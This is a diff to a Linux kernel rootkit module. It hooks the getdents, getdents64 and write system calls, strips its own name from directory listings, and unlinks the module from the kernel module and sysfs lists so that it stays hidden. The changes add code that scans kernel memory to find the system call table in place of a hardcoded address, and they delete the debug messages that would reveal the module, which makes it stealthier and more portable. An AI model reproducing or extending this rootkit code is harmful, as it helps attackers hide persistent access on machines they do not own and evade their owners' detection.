@@ -11,8 +11,7 @@ static int temp;
 static char desc[50];
 
 // unsigned long *syscall_table = NULL;
-unsigned long* syscall_table = (unsigned long*)0xffffffff816001e0;
-// found with grep sys_call_table /boot/System.map-4.* | head -n 1 | awk '{print $1}'
+unsigned long* syscall_table;
 //typedef asmlinkage long (*original_stuff) (const char *, int, mode_t);
 //original_stuff original_write;
 asmlinkage long (*original_write)(unsigned int,
@@ -28,7 +27,6 @@ asmlinkage long (*original_getdents)(unsigned int,
 
 asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
 {
-    // printk(KERN_ALERT "test write");
     return original_write(i,u,s);
 }
 
@@ -52,24 +50,20 @@ asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
          char* next_rec;
          char* remaining_dirents;
          if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
-             // printk(KERN_ALERT "test 1. %s\n", new_dir->d_name);
              reclen = new_dir->d_reclen;
              next_rec = (char *)new_dir + reclen;
-             // printk(KERN_ALERT "test new_dir: %s\n", next_rec);
              len = (int *)dirp + tmp - (int *)next_rec;
              remaining_dirents = kmalloc(len, GFP_KERNEL);
              if(copy_from_user(remaining_dirents, next_rec, len))
                  continue;
              if(copy_to_user(new_dir, remaining_dirents, len))
                  continue;
-             // printk(KERN_ALERT "test 2. %s\n", new_dir->d_name);
              kfree(remaining_dirents);
              tmp -= reclen;
              continue;
          }
          i += new_dir->d_reclen;
          new_dir = (struct linux_dirent64*)((char *)dirp + i);
-         // printk(KERN_ALERT "test next: %s\n", new_dir->d_name);
      }
      return tmp;
  }
@@ -87,24 +81,20 @@ asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
          char* next_rec;
          char* remaining_dirents;
          if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
-             // printk(KERN_ALERT "test 1. %s\n", new_dir->d_name);
              reclen = new_dir->d_reclen;
              next_rec = (char *)new_dir + reclen;
-             // printk(KERN_ALERT "test new_dir: %s\n", next_rec);
              len = (int *)dirp + tmp - (int *)next_rec;
              remaining_dirents = kmalloc(len, GFP_KERNEL);
              if(copy_from_user(remaining_dirents, next_rec, len))
                  continue;
              if(copy_to_user(new_dir, remaining_dirents, len))
                  continue;
-             // printk(KERN_ALERT "test 2. %s\n", new_dir->d_name);
              kfree(remaining_dirents);
              tmp -= reclen;
              continue;
          }
          i += new_dir->d_reclen;
          new_dir = (struct linux_dirent*)((char *)dirp + i);
-         // printk(KERN_ALERT "test next: %s\n", new_dir->d_name);
      }
      return tmp;
  }
@@ -117,10 +107,8 @@ void module_hide(void)
 		module_previous = THIS_MODULE->list.prev;
 		list_del(&THIS_MODULE->list);
 		module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
-		// kobject_del(&THIS_MODULE->mkobj.kobj);
 		list_del(&THIS_MODULE->mkobj.kobj.entry);
 		module_hidden = !module_hidden;
-		printk(KERN_INFO "Module hidden\n");
 }
 
 void module_show(void)
@@ -129,13 +117,8 @@ void module_show(void)
 		if(!module_hidden) return;
 
 		list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
-		// kobject_init(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.ktype);
-		// kobject_add(&THIS_MODULE->mkobj.kobj,
-		// 	THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
 		list_add(&THIS_MODULE->list, module_previous);
-		// mod_sysfs_setup(&THIS_MODULE, NULL, &THIS_MODULE->kp, 0);
 		module_hidden = !module_hidden;
-		printk(KERN_INFO "Module no longer hidden\n");
 }
 
 static ssize_t rtkit_read(struct file *file, char __user *buffer,
@@ -173,6 +156,22 @@ static const struct file_operations rootkit_fops = {
 		.write = rtkit_write,
 };
 
+static unsigned long **get_syscall_table(void)
+{
+    	unsigned long int offset = PAGE_OFFSET;
+    	unsigned long **syscall_t;
+
+    	while(offset < ULLONG_MAX){
+        		syscall_t = (unsigned long **)offset;
+
+        		if(syscall_t[__NR_close] == (unsigned long *) sys_close) {
+                        return syscall_t;
+                }
+        		offset += sizeof(void *);
+    	}
+    	return NULL;
+}
+
 /* Initialize proc file system */
 static int procfs_init(void)
 {
@@ -202,19 +201,21 @@ static int __init rootkit_init(void)
 {
 		if(!procfs_init()) {
 				procfs_clean();
-				return 1;
+				return -1;
 		}
-    original_getdents64 = (void*)syscall_table[__NR_getdents64];
-    original_getdents = (void*)syscall_table[__NR_getdents];
-    original_write = (void*)syscall_table[__NR_write];
-    /* Making sys_call_table read/write */
-    GPF_DISABLE();
-    syscall_table[__NR_getdents64] = (long)custom_getdents64;
-    syscall_table[__NR_getdents] = (long)custom_getdents;
-    syscall_table[__NR_write] = (long)custom_write;
-    /* sys_call_table back to read-only */
-    GPF_ENABLE();
-    printk(KERN_INFO "Loading rootkit\n");
+        if(!(syscall_table = (unsigned long *)get_syscall_table()))
+                return -1;
+
+        original_getdents64 = (void*)syscall_table[__NR_getdents64];
+        original_getdents = (void*)syscall_table[__NR_getdents];
+        original_write = (void*)syscall_table[__NR_write];
+        /* Making sys_call_table read/write */
+        GPF_DISABLE();
+        syscall_table[__NR_getdents64] = (long)custom_getdents64;
+        syscall_table[__NR_getdents] = (long)custom_getdents;
+        syscall_table[__NR_write] = (long)custom_write;
+        /* sys_call_table back to read-only */
+        GPF_ENABLE();
 		return 0;
 }
 
@@ -224,13 +225,13 @@ static void __exit rootkit_exit(void)
 		module_show();
 		procfs_clean();
 		module_hide();
-    /* Making sys_call_table read/write */
-    GPF_DISABLE();
-    syscall_table[__NR_write] = (long)original_write;
-    syscall_table[__NR_getdents] = (long)original_getdents;
-    syscall_table[__NR_getdents64] = (long)original_getdents64;
-    /* sys_call_table back to read-only */
-    GPF_ENABLE();
+        /* Making sys_call_table read/write */
+        GPF_DISABLE();
+        syscall_table[__NR_write] = (long)original_write;
+        syscall_table[__NR_getdents] = (long)original_getdents;
+        syscall_table[__NR_getdents64] = (long)original_getdents64;
+        /* sys_call_table back to read-only */
+        GPF_ENABLE();
 		printk(KERN_INFO "Closing rootkit\n");
 }
 
